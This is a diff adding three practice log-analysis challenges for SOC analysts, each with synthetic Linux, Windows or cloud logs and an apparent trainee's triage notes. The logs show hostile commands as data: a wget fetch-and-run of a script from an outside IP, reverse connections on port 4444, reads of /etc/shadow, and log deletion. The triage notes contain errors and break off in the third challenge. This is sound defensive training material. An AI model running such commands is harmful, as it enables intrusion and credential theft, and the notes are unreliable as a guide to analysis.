@@ -1,0 +1,191 @@
+
+1. 
+
+SOC L1 Log Analysis Challenge, designed to mirror a real-world scenario with mixed normal and malicious behavior.
+
+LOGS:
+
+May 17 09:01:12 srv2 sshd[2101]: Accepted password for linda from 10.0.0.31 port 51912 ssh2
+May 17 09:01:29 srv2 sshd[2102]: Accepted password for mark from 10.0.0.34 port 51091 ssh2
+May 17 09:03:02 srv2 sshd[2103]: Failed password for root from 102.45.122.19 port 49412 ssh2
+May 17 09:03:05 srv2 sshd[2104]: Failed password for root from 102.45.122.19 port 49413 ssh2
+May 17 09:03:07 srv2 sshd[2105]: Failed password for root from 102.45.122.19 port 49414 ssh2
+May 17 09:05:44 srv2 sudo: mark : TTY=pts/3 ; PWD=/home/mark ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+May 17 09:07:01 srv2 dnsmasq[2110]: query[A] github.com from 10.0.0.31
+May 17 09:07:02 srv2 dnsmasq[2111]: query[A] api.teams.microsoft.com from 10.0.0.34
+May 17 09:07:04 srv2 http-proxy[2112]: CONNECT github.com:443 from 10.0.0.31
+May 17 09:09:51 srv2 sshd[2113]: Accepted password for emily from 10.0.0.36 port 52213 ssh2
+May 17 09:10:16 srv2 sudo: emily : TTY=pts/1 ; PWD=/home/emily ; USER=root ; COMMAND=/usr/bin/top
+May 17 09:12:39 srv2 dnsmasq[2114]: query[A] update.msftconnecttest.com from 10.0.0.36
+May 17 09:13:22 srv2 http-proxy[2115]: CONNECT pastebin.com:443 from 10.0.0.34
+May 17 09:13:40 srv2 sudo: mark : TTY=pts/3 ; PWD=/home/mark ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.77/calc.py
+May 17 09:14:03 srv2 kernel: Executed Python script from /tmp/calc.py with UID 0
+May 17 09:14:17 srv2 dnsmasq[2116]: query[A] command-and-control.net from 10.0.0.34
+May 17 09:14:18 srv2 http-proxy[2117]: CONNECT command-and-control.net:443 from 10.0.0.34
+May 17 09:15:01 srv2 cron[2118]: (linda) CMD (/home/linda/backup.sh)
+May 17 09:16:04 srv2 sshd[2119]: Failed password for invalid user admin from 45.76.210.55 port 50121 ssh2
+May 17 09:16:06 srv2 sshd[2120]: Failed password for invalid user admin from 45.76.210.55 port 50122 ssh2
+May 17 09:16:09 srv2 sshd[2121]: Failed password for invalid user admin from 45.76.210.55 port 50123 ssh2
+May 17 09:18:25 srv2 sshd[2122]: Accepted password for jason from 10.0.0.40 port 51290 ssh2
+May 17 09:18:39 srv2 sudo: jason : TTY=pts/2 ; PWD=/home/jason ; USER=root ; COMMAND=/usr/bin/docker ps
+May 17 09:19:51 srv2 http-proxy[2123]: CONNECT reddit.com:443 from 10.0.0.40
+May 17 09:21:33 srv2 sshd[2124]: Accepted password for linda from 10.0.0.31 port 51913 ssh2
+May 17 09:21:51 srv2 dnsmasq[2125]: query[A] corporate.internal.net from 10.0.0.31
+May 17 09:22:12 srv2 http-proxy[2126]: CONNECT stackoverflow.com:443 from 10.0.0.36
+May 17 09:23:47 srv2 sudo: mark : TTY=pts/3 ; PWD=/home/mark ; USER=root ; COMMAND=/usr/bin/rm -rf /home/mark/logs
+May 17 09:24:51 srv2 kernel: Outbound connection to 203.0.113.77:4444 established from PID 1499 (python)
+May 17 09:26:01 srv2 sshd[2127]: Failed password for root from 198.51.100.82 port 50333 ssh2
+May 17 09:26:02 srv2 sshd[2128]: Failed password for root from 198.51.100.82 port 50334 ssh2
+May 17 09:26:04 srv2 sshd[2129]: Failed password for root from 198.51.100.82 port 50335 ssh2
+May 17 09:28:10 srv2 http-proxy[2130]: CONNECT hackerforums.net:443 from 10.0.0.34
+May 17 09:30:01 srv2 cron[2131]: (emily) CMD (/usr/bin/python3 /home/emily/data_clean.py)
+
+ANALYSIS:
+2103, 2104, 2015,
+- root acces from same IP=102.45.122.19 possible password cracking / brute force because it happened within short time frame and in exact 2 second ranges
+
+09:13:22 user was connected with this IP to microsoft teams which is nothing malicious but i dont know what is pastebin[.]com so i would need to look that up if I have time. Later the process is continuing I think best scenario would be to know if this is some developer and is doing nothing malicious or call mark if it is not prohibited by company policy if he is really doing this right now.
+
+2119, 2120, 2121 seems password cracking again this time from 45.76.210.55 this time in 3 second intervals would keep an eye on some strange behavior in some of the accounts
+
+we have a behavior which shouldnt be here this requires immediate attention because even if mark is a developer or not he just deleted logs, I dont think there is any reason why he would do this in his work PC, this requires immediate attention and possible quaratine to marks PC, also assign marks PC communication to another analyst to find out if there is was some malicious communication going on.
+at 09:24:51 we have kernel connection port 4444 - mostly malicious from python which was mark executing
+I would try to quaratine as much as possible and also escalate it to L2 immediately but this one as Immediate threat not Critical
+
+2127, 2128, 2129 are again password cracking / brute forcing this time from IP=198.51.100.82
+
+
+------------------------------------------------
+2. 
+
+You're monitoring a mixed environment with Linux and Windows systems. Users typically access shared drives, cloud apps, and dev tools.
+
+May 17 10:01:12 srv3 sshd[3001]: Accepted password for alice from 10.0.0.51 port 51022 ssh2
+May 17 10:01:18 DC01 EventLog[4624]: Successful login: User=CORP\james, LogonType=3, Source=10.0.0.55
+May 17 10:01:22 DC01 EventLog[4672]: Special privileges assigned to new logon: User=CORP\james
+May 17 10:02:09 DC01 EventLog[4625]: Failed login attempt: User=CORP\svc_backup, Source=10.0.0.55
+May 17 10:02:11 DC01 EventLog[4625]: Failed login attempt: User=CORP\svc_backup, Source=10.0.0.55
+May 17 10:03:02 srv3 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/htop
+May 17 10:03:45 DC01 EventLog[4688]: LSASS access attempt: Process=powershell.exe, User=CORP\james, Access=0x1010
+May 17 10:04:04 srv3 sshd[3002]: Accepted password for bob from 10.0.0.53 port 52219 ssh2
+May 17 10:04:12 srv3 sudo: bob : TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/cat /etc/shadow
+May 17 10:04:15 srv3 kernel: Denied access to shadow file from PID 4120 (cat)
+May 17 10:04:47 DC01 EventLog[4720]: User account added to Domain Admins: User=CORP\james
+May 17 10:05:32 DC01 EventLog[4689]: WMI Execution: Process=wscript.exe, Host=DC01, Initiator=10.0.0.55
+May 17 10:06:01 srv3 sshd[3003]: Failed password for root from 185.99.132.12 port 60322 ssh2
+May 17 10:06:02 srv3 sshd[3004]: Failed password for root from 185.99.132.12 port 60323 ssh2
+May 17 10:06:03 srv3 sshd[3005]: Failed password for root from 185.99.132.12 port 60324 ssh2
+May 17 10:07:15 srv3 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.23/sync.py
+May 17 10:07:29 srv3 kernel: Executed Python script from /tmp/sync.py with UID 0
+May 17 10:08:44 srv4 sshd[3006]: Accepted password for carl from 10.0.0.55 port 51512 ssh2
+May 17 10:08:51 srv4 sudo: carl : TTY=pts/3 ; PWD=/home/carl ; USER=root ; COMMAND=/usr/bin/python3 /home/carl/inventory.py
+May 17 10:09:07 srv3 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/rm -rf /var/log/auth.log
+May 17 10:09:12 srv3 kernel: Log file /var/log/auth.log deleted by PID 4512 (rm)
+May 17 10:10:01 DC01 EventLog[4673]: Privilege escalation attempt detected via LSASS dump
+May 17 10:11:02 DC01 EventLog[4728]: Scheduled task created: "Windows Update Check" by CORP\james
+May 17 10:11:21 srv3 sshd[3007]: Accepted password for emma from 10.0.0.57 port 52342 ssh2
+May 17 10:12:05 DC01 EventLog[4648]: Shared folder access: User=CORP\james, Share=\\SRV-FILES\HR
+May 17 10:12:19 srv3 sudo: emma : TTY=pts/1 ; PWD=/home/emma ; USER=root ; COMMAND=/usr/bin/vim /etc/hosts
+May 17 10:12:41 DC01 EventLog[4741]: DNS query submitted by CORP\james for domain "hidden-c2.cn"
+May 17 10:13:09 srv4 sshd[3008]: Accepted password for bob from 10.0.0.53 port 51122 ssh2
+May 17 10:13:18 srv4 sudo: bob : TTY=pts/4 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/top
+May 17 10:14:01 DC01 EventLog[4688]: LSASS access attempt: Process=taskmgr.exe, User=CORP\james, Access=0x1010
+May 17 10:14:22 DC01 EventLog[4647]: SMB Copy initiated by CORP\james from \\SRV-FILES\HR to \\10.0.0.88\temp
+May 17 10:15:31 srv3 kernel: Outbound connection to 198.51.100.23:4444 established from PID 5032 (python)
+May 17 10:15:58 DC01 EventLog[4725]: Remote registry accessed by CORP\james from 10.0.0.55
+May 17 10:16:45 srv4 sshd[3009]: Failed password for invalid user guest from 203.0.113.9 port 42215 ssh2
+May 17 10:17:01 srv3 crond[3010]: (emma) CMD (/home/emma/scripts/cleanup.sh)
+May 17 10:17:33 srv3 sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/mkdir /opt/tmp/logs
+May 17 10:18:02 DC01 EventLog[4689]: WMI Execution: Process=cmd.exe, Host=DC01, Initiator=10.0.0.55
+May 17 10:18:41 srv3 kernel: Suspicious process tree from PID 5032: python -> bash -> socat
+May 17 10:19:08 DC01 EventLog[4728]: Scheduled task created: "System Idle Update" by CORP\james
+May 17 10:20:44 DC01 EventLog[4649]: Group policy updated for CORP\james
+May 17 10:21:31 srv4 sshd[3010]: Accepted password for carl from 10.0.0.55 port 51514 ssh2
+May 17 10:21:42 srv4 sudo: carl : TTY=pts/3 ; PWD=/home/carl ; USER=root ; COMMAND=/usr/bin/python3 /home/carl/inventory.py
+
+ANALYSIS:
+
+10:02:11 straight away new user James gets assigned priviledges and first thing tries to access corporate backup that requires attention
+
+10:04:12 bob tries also shadow -> which upon examination stores user encrypted passwords and credentials this also requires more informatiom but rather categorize it as malicious and be wrong than have a break or leak of credentials
+
+10:03:45 upon examination of 0x1010 james is trying to read memory another suspicious behavior -> he should be contacted immedistely if company policy doesnt deny it or at least watched for further information
+
+10:06:01 - 02 - 03 we also have external connection from 185.99.132.12 trying what looks like brute force / password cracking
+
+10:04:47 james was added to domain admins and executes script this would require immediate attention and possible escalation or adding another analyst as for one person 2 breaches at once could be too much to handle
+
+james is checking for windows update in my opinion for possible later version of windows in case which has not patched certain vulnerabilities
+
+10:09:07 we have alice deleting LOGS for which I belive she has absolutely no reason
+
+by this time I would assume all three accounts are compromised and require IMMEDIATE escalation and attention of other analysts also
+
+10:12:41 james is connecting to external url with china .cn domain
+
+10:15:31 outbount connection established on port 4444 IP=198.51.100.23 established from python
+
+10:17:33 alice is accesing logs in /temp/ i think for possible deletion of them and covering tracks
+
+10:19:08 James created Update -> update for possible covering of tracks of the attack and updates group policy
+
+if it were on me 10:04:47 would be breaking point and I would try to quarantine the actions of James + contact other analysts about possible attack, by the time I was sure that Bob, James and Alice I would have called for High priority escalation and critical alert to L2
+
+
+------------------------------------------------------------
+3. 
+
+cloud/SaaS-focused log analysis challenge
+
+Suspicious behavior in tools like Microsoft 365, Google Workspace, Slack, or Dropbox
+Impossible travel, OAuth abuse
+LOGS:
+May 17 08:02:11 GSuite: Successful login for user emily@company.com from IP 83.22.12.19 (Location: Poland)
+May 17 08:03:23 GSuite: emily@company.com accessed file "Q2_budget_plan.xlsx" from Drive
+May 17 08:04:15 GSuite: emily@company.com downloaded "Q2_budget_plan.xlsx" to local device
+May 17 08:05:09 GSuite: emily@company.com shared "Q2_budget_plan.xlsx" with external address "lukasz.pvt@gmail.com"
+May 17 08:07:11 Slack: User emily@company.com sent private message to @lukasz containing message: "let's keep this off company chat, ok?"
+May 17 08:07:41 Slack: File "plan.png" uploaded in DM between emily and lukasz
+May 17 08:08:02 GitHub: New personal access token created by alex@company.com with scope=repo,admin:org
+May 17 08:08:44 GitHub: alex@company.com added OAuth app "RepoSync" to company-org
+May 17 08:09:31 GSuite: Successful login for user emily@company.com from IP 203.0.113.45 (Location: Singapore)
+May 17 08:09:39 GSuite: Suspicious login alert triggered: Impossible travel for user emily@company.com
+May 17 08:10:02 GSuite: emily@company.com downloaded "staff_directory.pdf"
+May 17 08:11:24 GitHub: alex@company.com cloned private repo "infra-secrets"
+May 17 08:12:55 GitHub: alex@company.com removed branch protection rule from "infra-secrets"
+May 17 08:13:12 GitHub: alex@company.com force-pushed commit history in "infra-secrets"
+May 17 08:14:19 Slack: User james@company.com joined private channel "#dev-core"
+May 17 08:14:31 Slack: james@company.com posted: "Anyone seen Alex? He’s pushing changes to protected branches"
+May 17 08:15:44 GSuite: admin@company.com received 2FA push approval from unregistered device
+May 17 08:16:12 GSuite: admin@company.com logged in from IP 102.45.55.99 (Location: Unknown)
+May 17 08:17:04 GSuite: admin@company.com modified group permissions for "HR-Private"
+May 17 08:17:33 GSuite: admin@company.com exported user list for entire domain
+May 17 08:18:01 GSuite: admin@company.com enabled external sharing for Drive org-wide
+May 17 08:18:19 Slack: james@company.com messaged security@company.com: “I think something’s wrong with Alex or Admin account”
+May 17 08:19:42 GitHub: alex@company.com shared repo "infra-secrets" with external user "devbot2025"
+May 17 08:20:03 GSuite: emily@company.com signed out of all sessions
+May 17 08:20:44 GSuite: admin@company.com initiated Drive export for entire domain
+May 17 08:21:32 Slack: Alert: Sensitive term detected in DM (emily to lukasz): "pay rate, offer letter, breach"
+May 17 08:22:05 GSuite: emily@company.com account locked due to automated DLP rule trigger
+May 17 08:22:44 GitHub: alex@company.com deleted "infra-secrets" repo
+May 17 08:23:33 GSuite: admin@company.com disabled audit logging
+May 17 08:24:12 Slack: james@company.com posted in #security-ops: "Admin account is acting maliciously. Quarantine now."
+May 17 08:25:19 GSuite: admin@company.com failed login from IP 198.51.100.23
+May 17 08:26:01 GSuite: GCP API key created by admin@company.com with full access
+May 17 08:27:44 GitHub: External user devbot2025 cloned "infra-secrets"
+May 17 08:28:01 GSuite: admin@company.com account suspended by security automation
+May 17 08:29:41 GSuite: Audit logs re-enabled
+
+ANALYSIS:
+08:07:11 emily with message lets keep it off company chat seems of but this is not for me to judge, i would just forward it to compliance department
+it could also be attacker knowing these chat might be intercepted and trying to blink blink if someone reads it
+but by itself I wouldnt categorize emily or lukas as maliciois actors
+
+alex gives signed as true malicious actor
+08:08:02 alex posts OAuth to github repo (this alone should mark suspicious and would need rosponding)
+08:09:31 sucessful login for emily’s account while she seems to be logged in also to this account at the same time while she is in poland (or at least shows)
+08:11:24 alex acesses private repo
+08:12:55 alex removes branch protection
+08:16:12 admin from unregisterred IP
+08:19:42 shares internal repository with unknown account
+08:22:44 logging turned off
